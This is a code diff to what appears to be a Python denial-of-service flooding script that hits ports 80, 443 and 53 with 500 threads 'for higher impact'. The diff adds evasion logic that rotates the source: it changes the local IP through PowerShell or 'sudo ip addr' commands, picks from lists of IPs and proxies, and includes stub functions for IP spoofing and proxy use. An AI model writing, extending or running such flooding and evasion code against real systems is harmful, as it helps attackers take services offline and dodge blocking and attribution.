@@ -13,6 +13,18 @@ PORTS = [80, 443, 53]  # HTTP, HTTPS, DNS
 THREAD_COUNT = 500  # Increased thread count for higher impact
 DURATION = 120  # Increased attack duration
 
+# List of predefined IPs (could be collected from a range of sources or known IP blocks)
+IP_LIST = [
+    "192.168.1.10", "192.168.1.20", "10.0.0.1", "172.16.0.1",  # Add more as needed
+    # Add more IPs as needed
+]
+
+# List of proxies (format: 'ip:port')
+PROXY_LIST = [
+    "192.168.1.100:8080", "192.168.1.101:8080", "10.0.0.2:3128",
+    # Add more proxies as needed
+]
+
 def random_string(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
@@ -27,22 +39,52 @@ def random_geolocation_ip():
     return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
 def change_ip():
-    # PowerShell command to change IP address (Windows)
+    # Randomly select an IP handling method
+    method = random.choice(['change_local_ip', 'spoof_ip', 'rotate_ip_list', 'use_proxy'])
+    
+    if method == 'change_local_ip':
+        ip = random_geolocation_ip()
+        if os.name == 'nt':  # Windows
+            change_ip_windows(ip)
+        else:  # Linux
+            change_ip_linux(ip)
+    
+    elif method == 'spoof_ip':
+        ip = random_geolocation_ip()
+        spoof_ip(ip)
+    
+    elif method == 'rotate_ip_list':
+        ip = random.choice(IP_LIST)
+        if os.name == 'nt':  # Windows
+            change_ip_windows(ip)
+        else:  # Linux
+            change_ip_linux(ip)
+    
+    elif method == 'use_proxy':
+        proxy = random.choice(PROXY_LIST)
+        set_proxy(proxy)
+
+def change_ip_windows(ip):
     ps_command = """
     $newIP = "{ip}"
     $interfaceAlias = "Ethernet"
     $currentInterface = Get-NetAdapter -Name $interfaceAlias
     $currentInterface | New-NetIPAddress -IPAddress $newIP -PrefixLength 24 -DefaultGateway "192.168.1.1"
     """
-    # Linux command to change IP address (example)
-    linux_command = """
-    sudo ip addr add {ip}/24 dev eth0
-    """
-    ip = random_geolocation_ip()
-    if os.name == 'nt':  # Windows
-        subprocess.run(["powershell", "-Command", ps_command.format(ip=ip)], shell=True)
-    else:  # Linux
-        subprocess.run(linux_command.format(ip=ip), shell=True)
+    subprocess.run(["powershell", "-Command", ps_command.format(ip=ip)], shell=True)
+
+def change_ip_linux(ip):
+    linux_command = f"sudo ip addr add {ip}/24 dev eth0"
+    subprocess.run(linux_command, shell=True)
+
+def spoof_ip(ip):
+    # Spoof the source IP in a low-level packet (this is a simplified example)
+    print(f"IP Spoofed to: {ip}")
+    # Note: IP spoofing implementation will depend on your environment and libraries like Scapy.
+
+def set_proxy(proxy):
+    print(f"Using Proxy: {proxy}")
+    # Set up the proxy in the socket connection (not implemented here)
 
 def attack():
     try:
@@ -54,7 +96,7 @@ def attack():
             sock = socket.socket(socket.AF_INET, sock_type)
             sock.settimeout(5)
 
-            # Change IP address for each request
+            # Change IP address or apply IP handling method
             change_ip()
 
             try:
